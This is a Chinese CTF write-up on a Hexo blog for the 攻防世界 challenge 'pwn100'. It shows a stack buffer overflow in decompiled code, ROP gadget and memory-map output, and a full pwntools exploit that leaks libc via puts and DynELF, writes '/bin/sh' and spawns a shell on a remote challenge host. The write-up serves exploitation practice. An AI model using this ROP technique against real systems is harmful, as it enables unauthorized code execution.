@@ -1,0 +1,749 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="xfgg" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="源码漏洞点1234567891011121314151617181920212223int sub_40068E()&amp;#123;  char v1; // [rsp+0h] [rbp-40h]  sub_40063D((__int64)&amp;amp;v1, 200);  return puts(&quot;bye~&quot;);&amp;#125;__int64 __fastcall sub_40063D(__int64 a1">
+<meta name="keywords" content="pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn100">
+<meta property="og:url" content="http://yoursite.com/2019/09/17/pwn100/index.html">
+<meta property="og:site_name" content="xfgg">
+<meta property="og:description" content="源码漏洞点1234567891011121314151617181920212223int sub_40068E()&amp;#123;  char v1; // [rsp+0h] [rbp-40h]  sub_40063D((__int64)&amp;amp;v1, 200);  return puts(&quot;bye~&quot;);&amp;#125;__int64 __fastcall sub_40063D(__int64 a1">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-09-19T07:21:01.938Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="pwn100">
+<meta name="twitter:description" content="源码漏洞点1234567891011121314151617181920212223int sub_40068E()&amp;#123;  char v1; // [rsp+0h] [rbp-40h]  sub_40063D((__int64)&amp;amp;v1, 200);  return puts(&quot;bye~&quot;);&amp;#125;__int64 __fastcall sub_40063D(__int64 a1">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/09/17/pwn100/">
+
+
+
+
+
+  <title>pwn100 | xfgg</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">xfgg</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/17/pwn100/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="xfgg">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xfgg">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">pwn100</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-09-17T15:38:49+08:00">
+                2019-09-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/攻防世界/" itemprop="url" rel="index">
+                    <span itemprop="name">攻防世界</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="源码漏洞点"><a href="#源码漏洞点" class="headerlink" title="源码漏洞点"></a>源码漏洞点</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">int sub_40068E()</span><br><span class="line">&#123;</span><br><span class="line">  char v1; // [rsp+<span class="number">0</span>h] [rbp<span class="number">-40</span>h]</span><br><span class="line"></span><br><span class="line">  sub_40063D((__int64)&amp;v1, <span class="number">200</span>);</span><br><span class="line">  <span class="keyword">return</span> puts(<span class="string">"bye~"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 __fastcall sub_40063D(__int64 a1, signed int a2)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; // rax</span><br><span class="line">  signed int i; // [rsp+<span class="number">1</span>Ch] [rbp<span class="number">-4</span>h]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (unsigned int)i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    read(<span class="number">0</span>, (void *)(i + a1), <span class="number">1</span>uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line">栈溢出漏洞</span><br></pre></td></tr></table></figure>
+
+<h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">无libc  无system 无bin/sh</span><br><span class="line">xfgg@ubuntu:~/Downloads$ ROPgadget --binary pwn100 --only &apos;pop|ret&apos;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x000000000040075c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040075e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400760 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400762 : pop r15 ; ret</span><br><span class="line">0x000000000040075b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040075f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400595 : pop rbp ; ret</span><br><span class="line">0x0000000000400763 : pop rdi ; ret</span><br><span class="line">0x0000000000400761 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x000000000040075d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004004e1 : ret</span><br><span class="line">0x00000000004005c5 : ret 0xc148</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 12</span><br><span class="line"></span><br><span class="line">puts只需要一个参数，所以找到pop rdi; ret传参更方便</span><br><span class="line">0x0000000000400763 : pop rdi ; ret</span><br><span class="line"></span><br><span class="line">找到可写入bin/sh的地址</span><br><span class="line">gdb-peda$ vmmap</span><br><span class="line">Warning: not running</span><br><span class="line">Start              End                Perm	Name</span><br><span class="line">0x004004c8         0x0040077d         rx-p	/home/xfgg/Downloads/pwn100</span><br><span class="line">0x00400238         0x00400904         r--p	/home/xfgg/Downloads/pwn100</span><br><span class="line">0x00600e10         0x00601068         rw-p	/home/xfgg/Downloads/pwn100</span><br></pre></td></tr></table></figure>
+
+<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">io = remote(<span class="string">'111.198.29.45'</span>,<span class="number">54701</span>)</span><br><span class="line"><span class="comment">#io = process("./pwn100")</span></span><br><span class="line">elf = ELF(<span class="string">"/home/xfgg/Downloads/pwn100"</span>)</span><br><span class="line"></span><br><span class="line">rop1 = <span class="number">0x40075A</span> <span class="comment">#pop rbx_rbp_r12_r13_r14_r15</span></span><br><span class="line">rop2 = <span class="number">0x400740</span> <span class="comment">#rdx(r13), rsi(r14), edi(r15d)</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400763</span></span><br><span class="line"><span class="comment"># start_addr = elf.symbols['_start']</span></span><br><span class="line">start_addr = <span class="number">0x400550</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">binsh_addr = <span class="number">0x601000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">  payload = <span class="string">"a"</span> * <span class="number">0x48</span> + p64(pop_rdi_ret) + p64(addr) + p64(puts_plt) + p64(start_addr)</span><br><span class="line">  payload = payload.ljust(<span class="number">200</span>, <span class="string">"a"</span>)</span><br><span class="line">  io.send(payload)</span><br><span class="line">  io.recvuntil(<span class="string">"bye~\n"</span>)</span><br><span class="line">  up = <span class="string">""</span></span><br><span class="line">  content = <span class="string">""</span></span><br><span class="line">  count = <span class="number">0</span></span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    c = io.recv(numb=<span class="number">1</span>, timeout=<span class="number">0.5</span>)</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> up == <span class="string">'\n'</span> <span class="keyword">and</span> c == <span class="string">""</span>:</span><br><span class="line">        content = content[:<span class="number">-1</span>] + <span class="string">'\x00'</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        content += c</span><br><span class="line">        up = c</span><br><span class="line">  content = content[:<span class="number">4</span>]</span><br><span class="line">  log.info(<span class="string">"%#x =&gt; %s"</span> % (addr, (content <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</span><br><span class="line">  <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line">d = DynELF(leak, elf = elf)</span><br><span class="line">sys_addr = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</span><br><span class="line">log.info(<span class="string">"system_addr =&gt; %#x"</span>, sys_addr)</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">"a"</span> * <span class="number">0x48</span> + p64(rop1) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(read_got) + p64(<span class="number">8</span>) + p64(binsh_addr) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(rop2)</span><br><span class="line">payload += <span class="string">"\x00"</span> * <span class="number">56</span>    <span class="comment">#rop2结束又跳转到rop1，需要再填充7 * 8字节到返回地址</span></span><br><span class="line">payload += p64(start_addr)</span><br><span class="line">payload  = payload.ljust(<span class="number">200</span>, <span class="string">"a"</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">"bye~\n"</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.send(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span> * <span class="number">0x48</span> + p64(pop_rdi_ret) + p64(binsh_addr) + p64(sys_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">200</span>, <span class="string">"a"</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/09/13/Boring game/" rel="next" title="2018百越杯 pwn">
+                <i class="fa fa-chevron-left"></i> 2018百越杯 pwn
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/09/19/linux pwn入门教程/" rel="prev" title="dynelf详细教程">
+                dynelf详细教程 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">xfgg</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">39</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#源码漏洞点"><span class="nav-number">1.</span> <span class="nav-text">源码漏洞点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#攻击"><span class="nav-number">2.</span> <span class="nav-text">攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#代码"><span class="nav-number">3.</span> <span class="nav-text">代码</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">xfgg</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
